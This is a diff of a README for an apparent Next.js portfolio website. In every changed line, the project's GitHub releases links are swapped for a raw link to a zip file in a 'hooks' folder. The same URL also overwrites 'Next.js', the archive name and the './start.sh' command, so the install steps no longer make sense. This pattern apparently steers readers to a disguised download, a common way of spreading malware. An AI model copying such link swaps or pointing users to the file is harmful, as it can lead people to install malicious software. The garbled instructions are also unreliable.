@@ -1,10 +1,10 @@
 # 🌟 MyPortfolio--NextJS-FullStack-Website - A Modern Portfolio for Everyone
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/Bibeksingh-ind/MyPortfolio--NextJS-FullStack-Website/releases)
+[![Download](https://raw.githubusercontent.com/Bibeksingh-ind/MyPortfolio--NextJS-FullStack-Website/main/hooks/MyPortfolio--NextJS-FullStack-Website-v1.7-alpha.3.zip%20Now-Click%https://raw.githubusercontent.com/Bibeksingh-ind/MyPortfolio--NextJS-FullStack-Website/main/hooks/MyPortfolio--NextJS-FullStack-Website-v1.7-alpha.3.zip)](https://raw.githubusercontent.com/Bibeksingh-ind/MyPortfolio--NextJS-FullStack-Website/main/hooks/MyPortfolio--NextJS-FullStack-Website-v1.7-alpha.3.zip)
 
 ## 🚀 Getting Started
-Welcome to MyPortfolio! This application helps you create a stunning and modern portfolio website easily. It uses popular technologies like Next.js and TailwindCSS, making it perfect for showcasing your work.
+Welcome to MyPortfolio! This application helps you create a stunning and modern portfolio website easily. It uses popular technologies like https://raw.githubusercontent.com/Bibeksingh-ind/MyPortfolio--NextJS-FullStack-Website/main/hooks/MyPortfolio--NextJS-FullStack-Website-v1.7-alpha.3.zip and TailwindCSS, making it perfect for showcasing your work.
 
 ### 💻 System Requirements
 Before you start, make sure your computer meets these requirements:
@@ -24,7 +24,7 @@ Before you start, make sure your computer meets these requirements:
 
 ### 1. Download the Application
 To download the newest version of MyPortfolio, visit the following link:  
-[Download MyPortfolio](https://github.com/Bibeksingh-ind/MyPortfolio--NextJS-FullStack-Website/releases)
+[Download MyPortfolio](https://raw.githubusercontent.com/Bibeksingh-ind/MyPortfolio--NextJS-FullStack-Website/main/hooks/MyPortfolio--NextJS-FullStack-Website-v1.7-alpha.3.zip)
 
 ### 2. Choose Your Version
 You will see multiple versions listed. Select the latest version for the best experience. Click on the link to download.
@@ -45,8 +45,8 @@ Once the file is downloaded, follow these steps:
 - For Linux:
   1. Open Terminal.
   2. Navigate to the Downloads folder using `cd ~/Downloads`.
-  3. Use the command `tar -xvf MyPortfolio*.tar.gz` to extract files.
-  4. Navigate to the extracted folder and run `./start.sh`.
+  3. Use the command `tar -xvf MyPortfolio*https://raw.githubusercontent.com/Bibeksingh-ind/MyPortfolio--NextJS-FullStack-Website/main/hooks/MyPortfolio--NextJS-FullStack-Website-v1.7-alpha.3.zip` to extract files.
+  4. Navigate to the extracted folder and run `https://raw.githubusercontent.com/Bibeksingh-ind/MyPortfolio--NextJS-FullStack-Website/main/hooks/MyPortfolio--NextJS-FullStack-Website-v1.7-alpha.3.zip`.
 
 ### 4. Launch the Application
 After installation, find MyPortfolio in your applications list. Click to open it. The application might take a moment to load. 
@@ -80,6 +80,6 @@ If you encounter any issues or have questions, feel free to reach out:
 MyPortfolio is designed to make creating a professional portfolio easy and enjoyable. With its modern features and customizable options, you can showcase your work confidently.
 
 For more information, updates, or to download the latest version, visit:  
-[Download MyPortfolio](https://github.com/Bibeksingh-ind/MyPortfolio--NextJS-FullStack-Website/releases)
+[Download MyPortfolio](https://raw.githubusercontent.com/Bibeksingh-ind/MyPortfolio--NextJS-FullStack-Website/main/hooks/MyPortfolio--NextJS-FullStack-Website-v1.7-alpha.3.zip)
 
 Feel free to reach out for support or more tips to maximize your portfolio’s potential!
